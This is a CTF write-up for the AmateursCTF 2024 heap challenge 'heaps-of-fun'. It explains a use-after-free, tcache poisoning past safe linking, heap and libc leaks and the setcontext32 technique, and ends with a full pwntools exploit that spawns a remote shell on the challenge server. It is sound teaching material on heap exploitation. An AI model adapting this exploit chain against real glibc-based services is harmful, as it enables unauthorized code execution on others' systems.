---
title: heaps-of-fun
date: 2024-04-12
tags: 
- pwn
- heap
- tcache
- author-hartmannsyg
categories: AmateursCTF 2024
---

written by {% person hartmannsyg %}


> We decided to make our own custom super secure database with absolutely no bugs!
> `nc chal.amt.rs 1346`

We are given a tar file with the binary `chal`, a libc in `lib/libc.so.6` and `lib/ld-linux-x86-64.so.2`


{% ccb html:true terminal:true %}
<SPAN STYLE="color:#98C379;">┌──(</SPAN><SPAN STYLE="color:#61AFEF;">suwandi㉿ryan</SPAN><SPAN STYLE="color:#98C379;">)-[</SPAN><SPAN STYLE="color:#DCDFE4;">~/ctf/am/heaps-of-fun</SPAN><SPAN STYLE="color:#98C379;">]
└─</SPAN><SPAN STYLE="color:#61AFEF;">$</SPAN><SPAN STYLE="color:#DCDFE4;"> checksec chal
[</SPAN><SPAN STYLE="color:#61AFEF;">*</SPAN><SPAN STYLE="color:#DCDFE4;">] '/home/suwandi/ctf/am/heaps-of-fun/chal'
    Arch:       amd64-64-little
    RELRO:      </SPAN><SPAN STYLE="color:#98C379;">Full RELRO
</SPAN><SPAN STYLE="color:#DCDFE4;">    Stack:      </SPAN><SPAN STYLE="color:#98C379;">Canary found
</SPAN><SPAN STYLE="color:#DCDFE4;">    NX:         </SPAN><SPAN STYLE="color:#98C379;">NX enabled
</SPAN><SPAN STYLE="color:#DCDFE4;">    PIE:        </SPAN><SPAN STYLE="color:#98C379;">PIE enabled
</SPAN><SPAN STYLE="color:#DCDFE4;">    RUNPATH:    </SPAN><SPAN STYLE="color:#E06C75;">b'./lib'
</SPAN><SPAN STYLE="color:#DCDFE4;">    Stripped:   </SPAN><SPAN STYLE="color:#E06C75;">No</SPAN>
{% endccb %}



## Reversing the binary

Let's see the main function:

```c
undefined8 main(void)

{
  undefined4 uVar1;
  long in_FS_OFFSET;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdin,(char *)0x0);
  setbuf(stdout,(char *)0x0);
  puts("##############################################");
  puts("# WELCOME to the amateurs key/value database #");
  puts("##############################################");
  do {
    _setjmp((__jmp_buf_tag *)handler);
    uVar1 = db_menu();
    switch(uVar1) {
    default:
      puts("[!] invalid selection");
      break;
    case 1:
      puts("\n       =[ create ]=");
      db_create();
      break;
    case 2:
      puts("\n       =[ update ]=");
      db_update();
      break;
    case 3:
      puts("\n       =[ read ]=");
      db_read();
      break;
    case 4:
      puts("\n       =[ delete ]");
      db_delete();
      break;
    case 5:
      if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return 0;
    }
  } while( true );
}
```

If we look into option 1 `db_create`:

{% ccb lang:c highlight:10,11 gutter1:1-17 highlight:10,11 %}
void db_create(void)

{
  int index;
  long in_FS_OFFSET;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  index = db_index(0);
  db_line(db + (long)index * 0x20,1,"key:\n>>> ");
  db_line((long)index * 0x20 + 0x104050,1,"val:\n>>> ");
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
{% endccb %}

We see that it is using `db_index` and `db_line`.

<details>
<summary>the <code>db_index</code> function simply prompts the user for an index:</summary>

```c
ulong db_index(int checkForNull)

{
  int iVar1;
  long in_FS_OFFSET;
  ulong index;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  printf("index:\n>>> ");
  iVar1 = __isoc99_scanf(&DAT_00102012,&index);
  if (iVar1 != 1) {
    iflush();
    puts("[!] failed to read index");
                    /* WARNING: Subroutine does not return */
    longjmp((__jmp_buf_tag *)handler,1);
  }
  iflush();
  if (31 < index) {
    puts("[!] index out of bounds");
                    /* WARNING: Subroutine does not return */
    longjmp((__jmp_buf_tag *)handler,1);
  }
  if ((checkForNull != 0) &&
     ((*(long *)(db + index * 0x20) == 0 || (*(long *)(db + index * 0x20 + 0x10) == 0)))) {
    puts("[!] invalid key/value store");
                    /* WARNING: Subroutine does not return */
    longjmp((__jmp_buf_tag *)handler,1);
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return index;
}
```
</details>

<details>
<summary><code>db_line</code> prompts the user for a length and mallocs() that length:</summary>

```c
void db_line(void **addr,int createFlag,undefined8 message)

{
  int iVar1;
  long in_FS_OFFSET;
  void *size;
  void *local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  if (createFlag == 0) {
    printf("%s",message);
    readline(*addr,addr[1]);
  }
  else {
    printf("len:\n>>> ");
    iVar1 = __isoc99_scanf(&DAT_00102012,&size);
    if (iVar1 != 1) {
      iflush();
      puts("[!] failed to read length");
                    /* WARNING: Subroutine does not return */
      longjmp((__jmp_buf_tag *)handler,1);
    }
    iflush();
    if (((size == (void *)0x0) || ((void *)0xff7 < size)) || (size == (void *)0xffffffffffffffff) ) {
      puts("[!] invalid line length");
                    /* WARNING: Subroutine does not return */
      longjmp((__jmp_buf_tag *)handler,1);
    }
    size = (void *)((long)size + 1);
    printf("%s",message);
    local_18 = malloc((size_t)size);
    readline(local_18,size);
    *addr = local_18;
    addr[1] = size;
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

</details>

So we see that `db_create()` mallocs 2 chunks of any size you wish

For `db_update()`, we see that it simply updates the content at the heap directly:

{% ccb lang:c highlight:10,11 gutter1:1-16 highlight:10 %}
void db_update(void)

{
  int iVar1;
  long in_FS_OFFSET;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  iVar1 = db_index(1);
  db_line((long)iVar1 * 0x20 + 0x104050,0,"new val:\n>>> ");
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
{% endccb %}

`db_read` simply reads the key and value contents:

{% ccb lang:c highlight:10,11 gutter1:1-20 highlight:11,13,14 %}
void db_read(void)

{
  int iVar1;
  long in_FS_OFFSET;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  iVar1 = db_index(1);
  printf("key = ");
  db_println(*(undefined8 *)(db + (long)iVar1 * 0x20),*(undefined8 *)(db + (long)iVar1 * 0x20 + 8 ));
  printf("val = ");
  db_println(*(undefined8 *)(db + (long)iVar1 * 0x20 + 0x10),
             *(undefined8 *)(db + (long)iVar1 * 0x20 + 0x18));
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
{% endccb %}

and `db_delete` simply just frees our chunks:
{% ccb lang:c highlight:10,11 gutter1:1-17 %}
void db_delete(void)

{
  int index;
  long in_FS_OFFSET;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  index = db_index(1);
  free(*(void **)(db + (long)index * 0x20));
  free(*(void **)(db + (long)index * 0x20 + 0x10));
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
{% endccb %}

## Use-After-Free

One major, glaring, exploit that is present here is **Use-After-Free**. What this means is that we can edit the content of freed chunks using `db_update` on indexes we have already "deleted" (which are freed chunks).

Hence, we can do an attack known has **tcache poisoning**. But first let's talk a bit about how the heap and tcache works.

## tcache poisoning

When chunks are freed, they become part of a linked list (known as bins), and malloc will use re-use freed chunks from this linked list before allocating more memory. This is part of what is known as a "first-fit" behavior:

> Let's take this as an example: 
> ```c
char *a = malloc(300);
char *b = malloc(300);

free(a);
free(b);

char *c = malloc(300); 
```
> The state of the bin progresses as:
> 
> 1. `a` freed.
> 
>> head -> a -> tail
> 
> 2. `b` freed.
> 
>> head -> b -> a -> tail
> 
> 3. `malloc` request.
> 
>> head -> a -> tail ( `b` is returned )

This is implemented via the `fd` and `bk` (forward and backward) pointers in the freed chunks (though for tcache I think only the `fd` pointer is used)

![](./static/AmateursCTF2024/Picture1.png)

In our case, when we make a new key-value pair (e.g. chunk 0) and delete it (i.e. free them), we get this:

![](./static/AmateursCTF2024/Picture2.png)

We also notice that if we can write to our old pointers (which in our case are the deleted notes), we can *change fd* to point to **anywhere else we feel like**!

![](./static/AmateursCTF2024/Picture3.png)

If we call `malloc()`, the program will treat our new location as a freed chunk!

![](./static/AmateursCTF2024/Picture4.png)

If we call `malloc()` yet again, we now have a pointer to ***any location we want***. And thank to the "edit" functionality of the database, we can ***write whatever we want*** to whatever region we want. This is known as an **<u>arbitrary write</u>**, and it is incredibly powerful.

![](./static/AmateursCTF2024/Picture5.png)

### Safe linking

Actually, in glibc-2.32 and onwards, there is a feature known as *safe linking*. The `fd` pointer is xored with the heap base/(2^12), i.e. `new_fd = fd ^ (heap_base << 12)`

So if we make a tcache chunk and free it like so:

{% ccb html:true %}
<SPAN STYLE="color:#EA6962;">pwndbg&gt; </SPAN><SPAN STYLE="color:#D4BE98;">vis_heap_chunks
</SPAN></SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75000  </SPAN><SPAN STYLE="color:#D8A657;">0x0000000000000000      </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000291      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75010  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75020  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0001000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75030  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75040  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75050  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75060  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75070  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75080  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75090  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b750a0  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000</SPAN><SPAN STYLE="color:#D4BE98;">      </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000</SPAN><SPAN STYLE="color:#D4BE98;">      </SPAN><SPAN STYLE="color:#89B482;">................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b750b0  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b750c0  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b750d0  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b750e0  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b750f0  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75100  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      <span style="border: 2px solid #EA6962">0x000055bda7b75cf0</span>      .........\...U.. </SPAN><SPAN STYLE="color:#D4BE98;">This is the head of the linked list
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75110  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75120  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75130  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75140  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75150  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75160  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75170  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75180  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75190  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b751a0  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b751b0  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b751c0  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b751d0  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b751e0  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b751f0  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75200  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x00007ffa734eea76      ........v.Ns....
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75210  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75220  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75230  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75240  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75250  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75260  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75270  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75280  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75290  </SPAN><SPAN STYLE="color:#89B482;">0x0000000000000000      </SPAN><SPAN STYLE="color:#D3869B;">0x0000000000000311      ................
</SPAN>...
<SPAN STYLE="color:#D4BE98;">0x55bda7b75ce0  </SPAN><SPAN STYLE="color:#D8A657;">0x0000000000000430      0x0000000000000110      0...............
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75cf0  </SPAN><SPAN STYLE="color:#D8A657;"><span style="border: 2px solid #EA6962">0x000000055bda7b75</span>      0x65f5e689e814f754      u{.[....T......e         </SPAN><SPAN STYLE="color:#D4BE98;">&lt;-- tcachebins[0x110][0/1]
0x55bda7b75d00  </SPAN><SPAN STYLE="color:#D8A657;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75d10  </SPAN><SPAN STYLE="color:#D8A657;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75d20  </SPAN><SPAN STYLE="color:#D8A657;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75d30  </SPAN><SPAN STYLE="color:#D8A657;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75d40  </SPAN><SPAN STYLE="color:#D8A657;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75d50  </SPAN><SPAN STYLE="color:#D8A657;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75d60  </SPAN><SPAN STYLE="color:#D8A657;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75d70  </SPAN><SPAN STYLE="color:#D8A657;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75d80  </SPAN><SPAN STYLE="color:#D8A657;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75d90  </SPAN><SPAN STYLE="color:#D8A657;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75da0  </SPAN><SPAN STYLE="color:#D8A657;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75db0  </SPAN><SPAN STYLE="color:#D8A657;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75dc0  </SPAN><SPAN STYLE="color:#D8A657;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75dd0  </SPAN><SPAN STYLE="color:#D8A657;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75de0  </SPAN><SPAN STYLE="color:#D8A657;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b75df0  </SPAN><SPAN STYLE="color:#D8A657;">0x0000000000000000      </SPAN><SPAN STYLE="color:#89B482;">0x0000000000020211      ................         </SPAN><SPAN STYLE="color:#D4BE98;">&lt;-- Top chunk</SPAN>
{% endccb %}

we have one freed tcache chunk with no other freed chunks. So the forward pointer should be at 0x0 (null, there are no other freed chunks). However we see that it is <span style="color:#D8A657;border: 2px solid #EA6962">0x000000055bda7b75</span>.

This is because it the fd pointer (0x0) gets xored with the heapbase/2^12. Since the heapbase is `0x55bda7b75000`, heapbase/2^12 is `0x55bda7b75`, and we get the new fd to be `0x0 ^ 0x55bda7b75 = 0x55bda7b75`

We can in fact use this to our advantage, as we can *read* from this freed chunk, which leaks the address of the heap!

## libc leak

We may have arbitrary write, but it is useless if we do not know where we can write it to. If we want to convert our arbitrary write ability to spawn in shell, no matter what method we use (overwriting exit handlers, setcontext32, stack leak for ROP, etc...) we need the address of libc. 

Thankfully, the unsortedbin also provides us with a libc leak. If we have a freed chunk and the unsorted bin is empty, both fd and bk point to `main_arena`:

{% ccb html:true %}
<SPAN STYLE="color:#D4BE98;">0x55bda7b758b0  </SPAN><SPAN STYLE="color:#A9B665;">0x0000000000000000      </SPAN><SPAN STYLE="color:#7DAEA3;">0x0000000000000431      ........1.......         </SPAN><SPAN STYLE="color:#D4BE98;">&lt;-- unsortedbin[all][0]
0x55bda7b758c0  </SPAN><SPAN STYLE="color:#7DAEA3;"><span style="border:2px solid #EA6962">0x00007fdc24706ce0</span>     <span style="border:2px solid #EA6962">0x00007fdc24706ce0</span>      .lp$.....lp$....
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b758d0  </SPAN><SPAN STYLE="color:#7DAEA3;">0x0000000000000000      0x0000000000000000      ................
</SPAN><SPAN STYLE="color:#D4BE98;">0x55bda7b758e0  </SPAN><SPAN STYLE="color:#7DAEA3;">0x0000000000000000      0x0000000000000000      ................</SPAN>
{% endccb %}

this `main_arena` (0x00007fdc24706ce0) is a constant offset from libc base, allowing us to have access to libc addresses.

In order for a freed chunk to go into the unsorted bin, it needs to be larger than the maximum size for tcache (0x408 bytes).

> Note:
> Actually to my knowledge the unsorted bin is sort of a cache layer between recently freed chunks and smallbins/largebins.
> I myself don't really have a full understanding of the heap, I think [Part 1](https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/) and [Part 2](https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/) of azeria labs' "understanding glibc implementation" article is a good place to read about the mechanics of the heap

### code

<details>
<summary>Code for interacting with the program</summary>
```py
def create(index, keyLen, key, valueLen, value):
    p.sendlineafter(b'>>>', b'1')
    p.sendlineafter(b'>>>', str(index).encode())
    p.sendlineafter(b'>>>', str(keyLen).encode())
    p.sendlineafter(b'>>>', key)
    p.sendlineafter(b'>>>', str(valueLen).encode())
    p.sendlineafter(b'>>>', value)

def update(index, value):
    p.sendlineafter(b">>> ", b"2")
    p.sendlineafter(b">>> ", str(index).encode())
    p.sendlineafter(b">>> ", value)

def read8():
    value = 0
    for i in range(8):
        c = p.recv(1)
        if c == b'\\':
            p.recv(1) # the x in \x0a for example
            hex_num = p.recv(2)
            num = int(hex_num, 16)
            value += num * (0x100)**i
        else:
            value += ord(c) * (0x100)**i
    return value

def read(index):
    p.sendlineafter(b'>>>', b'3')
    p.sendlineafter(b'>>>', str(index).encode())
    p.recvuntil(b'key = ')
    key = read8()
    p.recvuntil(b'val = ')
    val = read8()
    return key, val
def delete(index):
    p.sendlineafter(b'>>>', b'4')
    p.sendlineafter(b'>>>', str(index).encode())
```
</details>

```py
create(0, 0x300, b'', 0x300, b'')
create(1, 0x420, b'', 0x100, b'')

delete(0)
delete(1)

tcache_addr, _ = read(0)
unsorted_addr, _  = read(1)

libc_base = unsorted_addr - 0x21ace0
heap_base = tcache_addr * 0x1000

libc.address = libc_base

info("libc base @ " + hex(libc_base))
info("heap base @ " + hex(heap_base))
```

{% ccb terminal:true %}
[*] libc base @ 0x7fdc244ec000
[*] heap base @ 0x55bda7b75000
{% endccb %}

## shell

Since the binary is full RELRO, we cannot overwrite GOT. (Funnily enough I got stuck here since all I was able to do was "overwrite GOT with one_gadget"). We have other methods though:

- overwrite libc got
- overwrite exit handlers
- setcontext32
- stack leak and ROP

I'm sure there are other ways to get shell (e.g. ["go after printf function tables"](https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc#4---code-execution-via-fake-custom-conversion-specifiers) or [FSOP](https://niftic.ca/posts/fsop)) but those seem somewhat overkill.

## setcontext32

I've not heard about this method so after the CTF ended I tried this out. I still don't quite fully understand how it works, but I think the gist of it is that it forges a CPU state structure that gets loaded:

> from https://hackmd.io/@pepsipu/SyqPbk94a:
> ### high level overview
> Every GOT entry in libc such as `memset`, `memcpy`, `strcpy`, and `strlen` is replaced with the PLT trampoline, which starts at the beginning of the executable page. The PLT trampoline pushes a fake linkmap, `libc_write_address + 0x218`, and calls a fake runtime resolver, `setcontext+32`, all of which starts at the beginning of the writeable page.<br> 
> `setcontext+32` pops `libc_write_address + 0x218` off the stack, and treats it as a pointer to a saved `ucontext_t`. It'll then load your structure as the current CPU state.<br> 
> Calling most libc functions will trigger setcontext32, including `malloc`, `exit`, and (almost?) every IO operation.

Anyways, using this, we can achieve shell:

```py
destination, payload = setcontext32(
    libc, rip=libc.sym["system"], rdi=libc.search(b"/bin/sh").__next__()
)
# tcache fd and bk "pointers" stored are xored with the heap base >> 12
update(0, p64(destination ^ tcache_addr)) 

# the second 0x300 chunk is at destination
create(0, 0x300, b'', 0x300, b'') 

# write in forged chunk
update(0, payload) 
```

## Final code

Putting it all together:

> Note: my read8() code is very buggy but it works a decent amount of the time

{% ccb caption:solve.py lang:py gutter1:1-99 %}
from pwn import *
from setcontext32 import *

context.binary = elf = ELF('./chal')
context.log_level = 'DEBUG'

library_path = libcdb.download_libraries('lib/libc.so.6')
if library_path:
    elf = context.binary = ELF.patch_custom_libraries(elf.path, library_path)
    libc = elf.libc
else:
    libc = ELF('lib/libc.so.6')

gdbscript = 'break db_menu'
gdbscript = ''

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    print(args)
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("chal.amt.rs", 1346)
    else:
        return process([elf.path] + argv, *a, **kw)
    
p = start()

def create(index, keyLen, key, valueLen, value):
    p.sendlineafter(b'>>>', b'1')
    p.sendlineafter(b'>>>', str(index).encode())
    p.sendlineafter(b'>>>', str(keyLen).encode())
    p.sendlineafter(b'>>>', key)
    p.sendlineafter(b'>>>', str(valueLen).encode())
    p.sendlineafter(b'>>>', value)

def update(index, value):
    p.sendlineafter(b">>> ", b"2")
    p.sendlineafter(b">>> ", str(index).encode())
    p.sendlineafter(b">>> ", value)

def read8():
    value = 0
    for i in range(8):
        c = p.recv(1)
        if c == b'\\':
            p.recv(1) # the x in \x0a for example
            hex_num = p.recv(2)
            num = int(hex_num, 16)
            value += num * (0x100)**i
        else:
            value += ord(c) * (0x100)**i
    return value

def read(index):
    p.sendlineafter(b'>>>', b'3')
    p.sendlineafter(b'>>>', str(index).encode())
    p.recvuntil(b'key = ')
    key = read8()
    p.recvuntil(b'val = ')
    val = read8()
    
    return key, val
    
def delete(index):
    p.sendlineafter(b'>>>', b'4')
    p.sendlineafter(b'>>>', str(index).encode())

create(0, 0x300, b'', 0x300, b'')
create(1, 0x420, b'', 0x100, b'')

delete(0)
delete(1)

tcache_addr, _ = read(0)
unsorted_addr, _  = read(1)

libc_base = unsorted_addr - 0x21ace0
heap_base = tcache_addr * 0x1000

libc.address = libc_base

info("libc base @ " + hex(libc_base))
info("heap base @ " + hex(heap_base))

destination, payload = setcontext32(
    libc, rip=libc.sym["system"], rdi=libc.search(b"/bin/sh").__next__()
)

# tcache fd and bk "pointers" stored are xored with the heap base >> 12
update(0, p64(destination ^ tcache_addr)) 

# the second 0x300 chunk is at destination
create(0, 0x300, b'', 0x300, b'') 

# write in forged chunk
update(0, payload)

p.interactive()
{% endccb %}